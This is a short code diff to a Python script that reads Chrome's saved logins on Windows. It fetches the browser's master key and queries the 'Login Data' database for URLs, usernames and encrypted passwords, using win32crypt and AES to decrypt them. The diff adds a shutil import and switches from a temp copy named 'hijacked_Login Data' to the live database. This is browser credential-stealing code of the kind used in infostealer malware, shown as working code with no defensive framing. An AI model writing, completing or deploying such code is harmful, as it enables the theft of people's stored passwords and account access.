@@ -3,6 +3,7 @@ import json
 import base64
 from win32crypt import CryptUnprotectData
 import sqlite3
+import shutil
 from Crypto.Cipher import AES
 
 def get_master_key(path: str) -> str:
@@ -36,7 +37,7 @@ def get_login_data(path: str):
     login_db = r'C:\Users\your_username\AppData\Local\Google\Chrome\User Data\Default\Login Data'
     if not os.path.exists(login_db):
         return
-    conn = sqlite3.connect(r'C:\Users\your_username\AppData\Local\Temp\hijacked_Login Data')
+    conn = sqlite3.connect(login_db)
     cursor = conn.cursor()
     cursor.execute(
         'SELECT action_url, username_value, password_value FROM logins')
